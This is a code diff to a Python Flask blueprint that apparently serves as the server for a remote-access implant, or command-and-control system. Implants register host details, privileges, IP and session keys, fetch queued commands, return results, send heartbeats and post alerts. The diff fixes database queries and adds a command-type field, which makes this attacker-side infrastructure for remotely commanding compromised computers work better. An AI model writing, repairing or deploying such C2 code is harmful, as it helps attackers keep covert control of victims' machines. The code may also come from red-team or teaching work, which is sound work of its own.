@@ -1,5 +1,5 @@
 import functools
-
+import json
 from datetime import datetime
 from msilib.schema import Error
 
@@ -22,7 +22,7 @@ bp = Blueprint('implant', __name__)
 def register():
     try:
         if request.method == 'POST':
-            print(request.json)
+            
             imp_id = request.json['computer_guid']
             now = datetime.now()
             current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
@@ -31,7 +31,7 @@ def register():
             computer_guid = request.json['computer_guid']
             cmp_prev = request.json['computer_privileges']
             ip = request.json['connecting_ip_address']
-            #session_key = request.json["session_key"]
+            imp_session_key = request.json["session_key"]
             first_seen = current_date_time
             last_seen = current_date_time
 
@@ -60,9 +60,9 @@ def register():
                             computer_name=cmp_name,
                             computer_user=user_name,
                             computer_guid=computer_guid,
-                            computer_privileges=cmp_prev,
+                            computer_privileges=json.dumps(cmp_prev),
                             connecting_ip_address=ip,
-                            # session_key=session_key,
+                            session_key=imp_session_key,
                             first_seen=first_seen,
                             last_seen=last_seen
                         )
@@ -106,15 +106,16 @@ def get_next_command():
                     current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                     cmd_id = next_command.command_id
                     next_command.time_issued = current_date_time
+                    command_type = next_command.command_type
                     next_command.status = "taken_by_implant"
                     db.session.commit()
-                    return jsonify({"command_id": cmd_id, "command": command})
+                    return jsonify({"command_id": cmd_id, "command_text": command,"command_type":command_type})
                 else:
-                    return jsonify({"command_id": -1, "command": "No command"})
+                    return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
         except Exception as e:
             print(e)
 
-            return jsonify({"command_id": -1, "command": "No command"})
+            return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
 
 
 
@@ -128,7 +129,7 @@ def store_command_results():
 
             if impl_id:
                 commands = Command.query.filter_by(computer_guid=impl_id, status="taken_by_implant",
-                                                command_id=cmd_id)
+                                                command_id=cmd_id).first()
                 if commands:
                     commands.command_result = result
                     commands.status = "completed"
@@ -140,7 +141,6 @@ def store_command_results():
             print(e)
 
             return jsonify({"status": "Error in posting result"})
-            pass
 
 
 @bp.route('/heartbeat', methods=['POST'])
@@ -149,20 +149,22 @@ def heartbeat():
         try:
             imp_id = request.json['computer_guid']
             try:
-                implant = Implant.query.filter_by(computer_guid=imp_id)
-                now = datetime.now()
-                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
-                implant.last_seen = current_date_time
-                return jsonify({"status": "keep Alive"})
+                implant = Implant.query.filter_by(computer_guid=imp_id).first()
+                if implant:
+                    now = datetime.now()
+                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
+                    implant.last_seen = current_date_time
+                    return jsonify({"status": "keep Alive"})
+                else:
+                    return jsonify({"status": "register first"})
+
             except Exception as e:
                 print(e)
 
                 return jsonify({"status": "register first"})
         except Exception as e:
             print(e)
-
             return jsonify({"status": "register first"})
-            pass
 
 
 @bp.route('/alert', methods=['POST'])
@@ -176,6 +178,8 @@ def alert():
                 current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                 alert = Alert(computer_guid=imp_id,
                               time_reported=current_date_time, alert=alert)
+                
+                db.session.commit()
                 return jsonify({"status": "Alert Registered"})
             except Exception as e:
                 print(e)
